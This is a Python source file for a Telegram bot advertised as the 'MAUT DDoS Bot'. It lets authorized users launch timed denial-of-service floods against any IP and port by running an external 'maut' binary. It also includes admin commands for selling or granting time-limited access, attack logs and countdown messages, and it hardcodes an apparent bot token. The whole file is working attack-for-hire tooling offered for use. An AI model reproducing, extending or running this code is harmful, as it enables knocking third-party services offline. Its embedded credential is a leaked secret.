import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock
import threading
import sys

# Bot configuration
bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
admin_id = {"8167507955"}  # Note: This should be a set of strings
USER_FILE = "users.txt"
USER_TIME_LIMITS = "user_limits.txt"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 600  # 5 minutes
MAX_ATTACK_TIME = 240  # 4 minutes (240 seconds)
IMAGE_URL = "https://t.me/gggkkkggggiii/9"
MAX_LOG_LINES = 50  # Maximum lines to keep in memory for logs

# Data storage
user_attack_data = {}
maut_cooldown = {}
allowed_user_ids = []
user_time_limits = {}
active_attacks = {}  # Track active attacks
attack_lock = Lock()  # Thread lock for attack operations
countdown_messages = {}  # Track countdown messages
attack_processes = {}  # Track attack subprocesses

def safe_int(value, default=None):
    """Safely convert to integer with default fallback"""
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def load_users():
    """Load authorized users and their time limits from files"""
    global allowed_user_ids, user_time_limits
    
    # Load allowed users
    try:
        if os.path.exists(USER_FILE):
            with open(USER_FILE, "r") as f:
                allowed_user_ids = [line.strip() for line in f if line.strip()]
        else:
            allowed_user_ids = []
    except Exception as e:
        print(f"Error loading users: {e}")
        allowed_user_ids = []
    
    # Load user time limits
    user_time_limits = {}
    try:
        if os.path.exists(USER_TIME_LIMITS):
            with open(USER_TIME_LIMITS, "r") as f:
                for line in f:
                    parts = line.strip().split("|")
                    if len(parts) == 3:
                        user_id, limit_sec, expiry = parts
                        user_time_limits[user_id] = (safe_int(limit_sec, 0), float(expiry))
    except Exception as e:
        print(f"Error loading user limits: {e}")

def save_users():
    """Save authorized users and their time limits to files"""
    try:
        # Save allowed users
        with open(USER_FILE, "w") as f:
            f.write("\n".join(filter(None, allowed_user_ids)))
        
        # Save user time limits
        with open(USER_TIME_LIMITS, "w") as f:
            for user_id, (limit_sec, expiry) in user_time_limits.items():
                if user_id and limit_sec is not None and expiry is not None:
                    f.write(f"{user_id}|{limit_sec}|{expiry}\n")
    except Exception as e:
        print(f"Error saving users: {e}")

def log_attack(user_id, target, port, attack_time):
    """Log attack details to file"""
    try:
        user_id_str = str(user_id)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | UserID:{user_id_str} | {target}:{port} | {attack_time}s\n"
        
        # Write to file
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
            
        return log_entry
    except Exception as e:
        print(f"Logging error: {e}")
        return None

def parse_time_input(time_str):
    """Parse human-readable time input into seconds"""
    if not time_str:
        return None
        
    time_str = time_str.lower()
    total_seconds = 0
    
    # Match all time components
    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
    
    for amount, unit in matches:
        amount = safe_int(amount, 0)
        if unit in ['day', 'd']:
            total_seconds += amount * 86400
        elif unit in ['hour', 'h']:
            total_seconds += amount * 3600
        elif unit in ['min', 'm']:
            total_seconds += amount * 60
        elif unit in ['sec', 's']:
            total_seconds += amount
    
    return total_seconds if total_seconds > 0 else None

def is_attack_active():
    """Check if any attack is currently active"""
    with attack_lock:
        return bool(active_attacks)

def add_active_attack(user_id, attack_time):
    """Add an attack to the active attacks tracker"""
    with attack_lock:
        active_attacks[str(user_id)] = {
            'start_time': datetime.datetime.now(),
            'duration': safe_int(attack_time, 0),
            'end_time': datetime.datetime.now() + datetime.timedelta(seconds=safe_int(attack_time, 0))
        }

def remove_active_attack(user_id):
    """Remove an attack from the active attacks tracker"""
    with attack_lock:
        user_id_str = str(user_id)
        if user_id_str in active_attacks:
            del active_attacks[user_id_str]
        if user_id_str in countdown_messages:
            del countdown_messages[user_id_str]
        if user_id_str in attack_processes:
            try:
                attack_processes[user_id_str].terminate()
            except:
                pass
            del attack_processes[user_id_str]

def get_active_attack_info():
    """Get information about the currently active attack"""
    with attack_lock:
        if not active_attacks:
            return None
            
        # Get the first active attack (since we only allow one at a time)
        user_id, attack = next(iter(active_attacks.items()))
        elapsed = (datetime.datetime.now() - attack['start_time']).seconds
        remaining = max(0, attack['duration'] - elapsed)
        return user_id, remaining

def validate_ip(ip):
    """Validate an IPv4 address"""
    if not ip:
        return False
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

def validate_port(port):
    """Validate a port number"""
    port_num = safe_int(port)
    return port_num is not None and 1 <= port_num <= 65535

def validate_attack_time(time_str):
    """Validate attack duration"""
    time_sec = safe_int(time_str)
    return time_sec is not None and 1 <= time_sec <= MAX_ATTACK_TIME

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command"""
    caption = """
🚀 *Welcome to MAUT DDoS Bot* 🚀

*Available Commands:*
/maut <ip> <port> <time> - Start attack
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

*Admin Commands:*
/add <user_id> <time> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/logs - View all attack logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Error sending image: {e}")
        try:
            bot.reply_to(message, caption, parse_mode="Markdown")
        except Exception as e2:
            print(f"Error sending text message: {e2}")

@bot.message_handler(commands=['maut'])
def handle_attack_command(message):
    """Handle attack command"""
    user_id = str(message.chat.id)
    
    # Check authorization
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied. Contact admin for access.")
    
    # Check if another attack is active
    active_info = get_active_attack_info()
    if active_info:
        active_user_id, remaining = active_info
        try:
            active_user = bot.get_chat(active_user_id)
            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {remaining} seconds.")
        except:
            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
    
    # Check cooldown
    if user_id in maut_cooldown:
        elapsed = (datetime.datetime.now() - maut_cooldown[user_id]).seconds
        remaining = max(0, COOLDOWN_TIME - elapsed)
        if remaining > 0:
            return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
    
    # Check time limit if exists
    if user_id in user_time_limits:
        limit_sec, expiry = user_time_limits[user_id]
        if time.time() > expiry:
            del user_time_limits[user_id]
            if user_id in allowed_user_ids:
                allowed_user_ids.remove(user_id)
            save_users()
            return bot.reply_to(message, "❌ Your access has expired. Contact admin.")
    
    # Parse command
    try:
        args = message.text.split()
        if len(args) != 4:
            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
        
        ip = args[1]
        port = args[2]
        attack_time = args[3]
        
        # Validate inputs
        if not validate_ip(ip):
            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
        
        if not validate_port(port):
            return bot.reply_to(message, "❌ Invalid port (1-65535)")
        
        attack_time_sec = safe_int(attack_time)
        if not validate_attack_time(attack_time):
            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME} seconds)")
        
        # Store attack data
        user_attack_data[user_id] = {
            'ip': ip,
            'port': port,
            'time': attack_time_sec
        }
        
        # Show confirmation
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Start Attack", callback_data="start_attack"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Summary:*\n\n"
            f"🌐 IP: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱ Time: `{attack_time}`s\n\n"
            f"Confirm attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error processing command: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    """Handle inline button callbacks"""
    if not call or not call.message:
        return
        
    user_id = str(call.message.chat.id)
    
    try:
        if call.data == "start_attack":
            if user_id not in user_attack_data:
                return bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
            
            data = user_attack_data[user_id]
            attack_time = safe_int(data['time'], 0)
            
            if attack_time <= 0:
                return bot.answer_callback_query(call.id, "❌ Invalid attack time")
            
            # Mark attack as active
            add_active_attack(user_id, attack_time)
            
            try:
                # Execute attack (in background)
                process = subprocess.Popen(
                    f"./maut {data['ip']} {data['port']} {attack_time} 900", 
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Store the process reference
                with attack_lock:
                    attack_processes[user_id] = process
                
                # Log the attack
                log_entry = log_attack(user_id, data['ip'], data['port'], attack_time)
                maut_cooldown[user_id] = datetime.datetime.now()
                
                # Get current time for countdown
                start_time = datetime.datetime.now()
                end_time = start_time + datetime.timedelta(seconds=attack_time)
                
                # Send initial attack message with countdown
                message_text = (
                    f"🔥 *Attack Launched!* 🔥\n\n"
                    f"🌐 Target: `{data['ip']}`\n"
                    f"🔌 Port: `{data['port']}`\n"
                    f"⏱ Duration: `{attack_time}`s\n"
                    f"⏳ Time Remaining: `{attack_time}`s\n\n"
                    f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)"
                )
                
                sent_msg = bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=message_text,
                    parse_mode="Markdown"
                )
                
                # Store message info for countdown updates
                with attack_lock:
                    countdown_messages[user_id] = {
                        'chat_id': call.message.chat.id,
                        'message_id': sent_msg.message_id,
                        'ip': data['ip'],
                        'port': data['port'],
                        'duration': attack_time,
                        'end_time': end_time,
                        'start_time': start_time
                    }
                
                # Start countdown updates
                threading.Thread(target=update_countdown, args=(user_id,), daemon=True).start()
                
            except Exception as e:
                remove_active_attack(user_id)
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"❌ Error launching attack: {str(e)}"
                )
        
        elif call.data == "cancel_attack":
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="❌ Attack cancelled"
            )
        
        elif call.data == "new_attack":
            if user_id in maut_cooldown:
                elapsed = (datetime.datetime.now() - maut_cooldown[user_id]).seconds
                remaining = max(0, COOLDOWN_TIME - elapsed)
                if remaining > 0:
                    return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
            
            bot.send_message(
                call.message.chat.id, 
                "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", 
                parse_mode="Markdown"
            )
        
        bot.answer_callback_query(call.id)
    
    except Exception as e:
        print(f"Error handling callback: {e}")
        try:
            bot.answer_callback_query(call.id, "❌ An error occurred")
        except:
            pass

def update_countdown(user_id):
    """Update the countdown timer for an active attack"""
    last_update = time.time()
    
    while True:
        try:
            with attack_lock:
                if user_id not in countdown_messages:
                    break
                    
                message_info = countdown_messages[user_id]
                now = datetime.datetime.now()
                remaining = max(0, (message_info['end_time'] - now).seconds)
                elapsed = (now - message_info['start_time']).seconds
                
                if remaining <= 0:
                    # Attack finished
                    remove_active_attack(user_id)
                    
                    # Send completion message
                    try:
                        bot.send_message(
                            message_info['chat_id'],
                            f"✅ *Attack Completed!*\n\n"
                            f"🌐 Target: `{message_info['ip']}`\n"
                            f"⏱ Duration: `{message_info['duration']}`s\n\n"
                            f"Cooldown: {COOLDOWN_TIME//60} minutes",
                            parse_mode="Markdown"
                        )
                        
                        # Add new attack button
                        markup = types.InlineKeyboardMarkup()
                        markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
                        bot.send_message(
                            message_info['chat_id'], 
                            "Attack finished! You can launch a new one when cooldown ends.", 
                            reply_markup=markup
                        )
                    except Exception as e:
                        print(f"Error sending completion message: {e}")
                    break
                
                # Only update every second to avoid rate limiting
                if time.time() - last_update >= 1:
                    try:
                        # Update the countdown message
                        progress_percent = min(100, (elapsed / message_info['duration']) * 100)
                        progress_bar = "🟢" * int(progress_percent / 10) + "⚪" * (10 - int(progress_percent / 10))
                        
                        bot.edit_message_text(
                            chat_id=message_info['chat_id'],
                            message_id=message_info['message_id'],
                            text=(
                                f"🔥 *Attack In Progress* 🔥\n\n"
                                f"🌐 Target: `{message_info['ip']}`\n"
                                f"🔌 Port: `{message_info['port']}`\n"
                                f"⏱ Duration: `{message_info['duration']}`s\n"
                                f"⏳ Time Remaining: `{remaining}`s\n"
                                f"{progress_bar} {int(progress_percent)}%\n\n"
                                f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)"
                            ),
                            parse_mode="Markdown"
                        )
                        last_update = time.time()
                    except Exception as e:
                        print(f"Error updating countdown: {e}")
                        if "message is not modified" not in str(e).lower():
                            break
                
            time.sleep(0.5)  # Check more frequently but update only every second
            
        except Exception as e:
            print(f"Error in countdown thread: {e}")
            break

@bot.message_handler(commands=['add'])
def add_user(message):
    """Add a new authorized user"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            return bot.reply_to(message, "❌ Usage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")
        
        new_user = args[1].strip()
        time_limit = args[2].strip()
        
        if not new_user.isdigit():
            return bot.reply_to(message, "❌ User ID must be numeric")
            
        if new_user in allowed_user_ids:
            return bot.reply_to(message, "ℹ️ User already exists.")
        
        limit_seconds = parse_time_input(time_limit)
        if not limit_seconds:
            return bot.reply_to(message, "❌ Invalid time format. Use like: 1day, 2hours30min")
        
        expiry_timestamp = time.time() + limit_seconds
        user_time_limits[new_user] = (limit_seconds, expiry_timestamp)
        allowed_user_ids.append(new_user)
        save_users()
        
        # Format time for response
        days = limit_seconds // 86400
        hours = (limit_seconds % 86400) // 3600
        minutes = (limit_seconds % 3600) // 60
        
        time_str = []
        if days: time_str.append(f"{days} day{'s' if days>1 else ''}")
        if hours: time_str.append(f"{hours} hour{'s' if hours>1 else ''}")
        if minutes: time_str.append(f"{minutes} minute{'s' if minutes>1 else ''}")
        
        bot.reply_to(message, f"✅ User {new_user} added with limit: {' '.join(time_str)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}\nUsage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Remove an authorized user"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        args = message.text.split()
        if len(args) < 2:
            return bot.reply_to(message, "❌ Usage: /remove <user_id>")
            
        user_to_remove = args[1].strip()
        
        if not user_to_remove.isdigit():
            return bot.reply_to(message, "❌ User ID must be numeric")
        
        if user_to_remove not in allowed_user_ids:
            return bot.reply_to(message, "❌ User not found.")
        
        allowed_user_ids.remove(user_to_remove)
        if user_to_remove in user_time_limits:
            del user_time_limits[user_to_remove]
        save_users()
        bot.reply_to(message, f"✅ User {user_to_remove} removed.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}\nUsage: /remove <user_id>")

@bot.message_handler(commands=['allusers'])
def list_users(message):
    """List all authorized users"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    if not allowed_user_ids:
        return bot.reply_to(message, "ℹ️ No users found.")
    
    users_list = []
    now = time.time()
    
    for user in allowed_user_ids:
        if user in user_time_limits:
            limit_sec, expiry = user_time_limits[user]
            if now < expiry:
                remaining = expiry - now
                days = int(remaining // 86400)
                hours = int((remaining % 86400) // 3600)
                mins = int((remaining % 3600) // 60)
                users_list.append(f"🟢 {user} (Expires in: {days}d {hours}h {mins}m)")
            else:
                users_list.append(f"🔴 {user} (Expired)")
        else:
            users_list.append(f"🟡 {user} (No limit)")
    
    bot.reply_to(message, "👥 Authorized Users:\n\n" + "\n".join(users_list))

@bot.message_handler(commands=['logs'])
def show_logs(message):
    """Show attack logs"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No logs available.")
    
    try:
        # Read last MAX_LOG_LINES lines
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()[-MAX_LOG_LINES:]
        
        if not lines:
            return bot.reply_to(message, "ℹ️ No logs available.")
        
        # Send logs in chunks to avoid message length limits
        chunk_size = 20
        for i in range(0, len(lines), chunk_size):
            chunk = lines[i:i+chunk_size]
            bot.send_message(message.chat.id, "📜 Attack Logs:\n\n" + "".join(chunk))
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error sending logs: {str(e)}")

@bot.message_handler(commands=['clearlogs'])
def clear_logs(message):
    """Clear attack logs"""
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        open(LOG_FILE, "w").close()
        bot.reply_to(message, "✅ Logs cleared.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error clearing logs: {str(e)}")

@bot.message_handler(commands=['mylogs'])
def my_logs(message):
    """Show user's attack logs"""
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied.")
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No attack history.")
    
    try:
        user_logs = []
        with open(LOG_FILE, "r") as f:
            for line in f:
                if f"UserID:{user_id}" in line:
                    user_logs.append(line)
        
        if not user_logs:
            return bot.reply_to(message, "ℹ️ No attacks found in your history.")
        
        # Show only the last 10 attacks
        bot.reply_to(message, f"📜 Your Attack History (last 10):\n\n" + "".join(user_logs[-10:]))
    except Exception as e:
        bot.reply_to(message, f"❌ Error reading logs: {str(e)}")

@bot.message_handler(commands=['help'])
def help_command(message):
    """Show help information"""
    help_text = """
🛠 *MAUT Bot Help* 🛠

*User Commands:*
/maut <ip> <port> <time> - Start attack
/mylogs - View your history
/rules - Usage guidelines

*Admin Commands:*
/add <user_id> <time> - Add user
/remove <user_id> - Remove user
/allusers - List users
/logs - View all logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    """Show usage rules"""
    rules = """
📜 *Usage Rules* 📜

1. Max attack time: 180 seconds
2. 5 minutes cooldown
3. No concurrent attacks
4. No illegal targets

Violations will result in ban.
"""
    bot.reply_to(message, rules, parse_mode="Markdown")

def cleanup_resources():
    """Clean up resources before exiting"""
    print("Cleaning up resources...")
    with attack_lock:
        # Terminate any active attacks
        for user_id, process in attack_processes.items():
            try:
                process.terminate()
            except:
                pass
        attack_processes.clear()
        active_attacks.clear()
        countdown_messages.clear()

def main():
    """Main function to initialize and run the bot"""
    # Initialize data
    load_users()
    
    print("⚡ MAUT Bot Starting ⚡")
    
    # Register cleanup for graceful exit
    import atexit
    atexit.register(cleanup_resources)
    
    # Start bot with error recovery
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, interval=1, timeout=30)
        except KeyboardInterrupt:
            print("Bot stopped by user")
            sys.exit(0)
        except Exception as e:
            print(f"Bot crashed with error: {e}")
            print("Restarting in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()
